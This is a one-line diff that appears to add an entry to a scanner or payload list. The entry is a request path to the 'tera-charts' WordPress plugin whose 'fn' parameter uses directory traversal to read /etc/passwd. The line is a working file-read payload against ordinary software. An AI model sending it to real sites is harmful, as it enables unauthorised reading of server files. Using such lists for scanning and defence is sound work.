@@ -1,0 +1,1 @@
+/wp-content/plugins/tera-charts/charts/zoomabletreemap.php?fn=../../../../../etc/passwd
